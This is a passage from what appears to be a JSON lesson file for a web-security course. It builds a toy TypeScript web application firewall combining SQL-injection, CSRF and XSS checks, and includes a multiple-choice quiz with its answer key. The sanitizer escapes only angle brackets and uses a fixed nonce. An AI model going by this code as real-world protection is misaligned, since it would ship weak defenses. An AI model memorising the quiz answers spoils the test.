isAuthorized: false, status: 'CSRF_REJECTED_ORIGIN' };\n  if (!token || token !== expected) return { isAuthorized: false, status: 'CSRF_REJECTED_TOKEN' };\n  return { isAuthorized: true, status: 'CSRF_NOMINAL' };\n}\n\nfunction processXssProtection(body: Record<string, any>, nonce: string) {\n  const sanitized: Record<string, any> = {};\n  for (const [k, v] of Object.entries(body)) {\n    sanitized[k] = typeof v === 'string' ? v.replace(/</g, '&lt;').replace(/>/g, '&gt;') : v;\n  }\n  return {\n    sanitizedBody: sanitized,\n    responseHeaders: { 'content-security-policy': \"script-src 'nonce-\" + nonce + \"';\" }\n  };\n}\n\ninterface WafRequest {\n  path: string;\n  method: string;\n  origin: string;\n  headers: Record<string, string>;\n  body: Record<string, any>;\n}\n\ninterface WafFinalResult {\n  decision: 'ACCEPT' | 'REJECT';\n  statusCode: number;\n  auditTrail: string[];\n  sanitizedBody?: Record<string, any>;\n  headers?: Record<string, string>;\n}\n\nfunction executeMasterWaf(req: WafRequest, allowedOrigin: string, validToken: string): WafFinalResult {\n  const audit: string[] = [];\n\n  // Stage 1: STRIDE Classification\n  const strideTags = classifyStrideThreat(req.path, req.headers);\n  audit.push('STRIDE Tags: ' + (strideTags.length ? strideTags.join(',') : 'NONE'));\n\n  // Stage 2: SQLi Check\n  const sqli = inspectSqlInjection(req.body);\n  if (!sqli.isSecure) {\n    audit.push('SQLi Blocked: ' + sqli.triggeredPattern);\n    return { decision: 'REJECT', statusCode: 400, auditTrail: audit };\n  }\n  audit.push('SQLi Check: PASSED');\n\n  // Stage 3: CSRF Check\n  const csrf = validateWafCsrf(req.method, req.origin, allowedOrigin, req.headers['x-csrf-token'], validToken);\n  if (!csrf.isAuthorized) {\n    audit.push('CSRF Blocked: ' + csrf.status);\n    return { decision: 'REJECT', statusCode: 403, auditTrail: audit };\n  }\n  audit.push('CSRF Check: PASSED');\n\n  // Stage 4: XSS Sanitization & CSP Injection\n  const xss = processXssProtection(req.body, 'nonce_master_99');\n  audit.push('XSS Sanitization: COMPLETED');\n\n  return {\n    decision: 'ACCEPT',\n    statusCode: 200,\n    auditTrail: audit,\n    sanitizedBody: xss.sanitizedBody,\n    headers: xss.responseHeaders\n  };\n}\n\nconst benignReq: WafRequest = {\n  path: '/api/v1/update',\n  method: 'POST',\n  origin: 'https://corp.io',\n  headers: { 'x-csrf-token': 'auth_tok_1' },\n  body: { comment: '<b>Hello World</b>', rating: 5 }\n};\n\nconst finalResult = executeMasterWaf(benignReq, 'https://corp.io', 'auth_tok_1');\nconsole.log('Final WAF Decision:', finalResult.decision);\nconsole.log('HTTP Status:', finalResult.statusCode);\nconsole.log('Audit Stages:', finalResult.auditTrail.length);\nconsole.log('Sanitized Comment:', finalResult.sanitizedBody?.comment);",
      "output": "Final WAF Decision: ACCEPT\nHTTP Status: 200\nAudit Stages: 4\nSanitized Comment: &lt;b&gt;Hello World&lt;/b&gt;",
      "codeNotes": [
        {
          "line": 15,
          "note": "Executes the four-stage sequential inspection pipeline across the incoming request."
        },
        {
          "line": 55,
          "note": "Validates successful end-to-end acceptance, sanitization, and audit recording."
        }
      ],
      "tryIt": "Inject a SQL injection payload into the comment field and verify the WAF terminates at Stage 2 with status 400.",
      "check": {
        "question": "What is the primary benefit of orchestrating threat classification, SQLi, CSRF, and XSS into a single WAF pipeline?",
        "options": [
          "It reduces CSS file sizes",
          "It provides unified, centralized security policy enforcement and comprehensive audit logging across all microservices",
          "It replaces the database indexing engine"
        ],
        "answer": 1,
        "why": "A unified WAF pipeline guarantees consistent enforcement, centralized monitoring, and early perimeter mitigation before traffic touches backend services."
      }
    }
  ],
  "summary": [
    "A Web Application Firewall (WAF) operates at Layer 7 to inspect and filter application-layer traffic before it reaches backend services.",
    "Automated STRIDE threat vector classification identifies attack patterns and enriches SIEM telemetry.",
    "SQL injection interceptors scan input parameters to catch malicious query syntax and enforce prepared statements.",
    "Context-aware XSS sanitization combined with strict CSP nonces neutralizes client-side script execution vectors.",
    "Milestone 1 unites threat modeling, SQL injection defense, XSS escaping, and CSRF protection into a cohesive enterprise security engine."
  ],
  "projectStep": {
    "title": "Project Step 5: Master Web Application Firewall & Security Suite",
    "steps": [
      "Integrate the STRIDE classifier, SQLi scanner, XSS sanitizer, and CSRF validator into a single pipeline class.",
      "Implement audit logging and security event dispatch for SIEM compliance reporting.",
      "Execute automated end-to-end test suites certifying that malicious vectors are blocked while legitimate requests are sanitized and approved."
    ]
  }
}
];
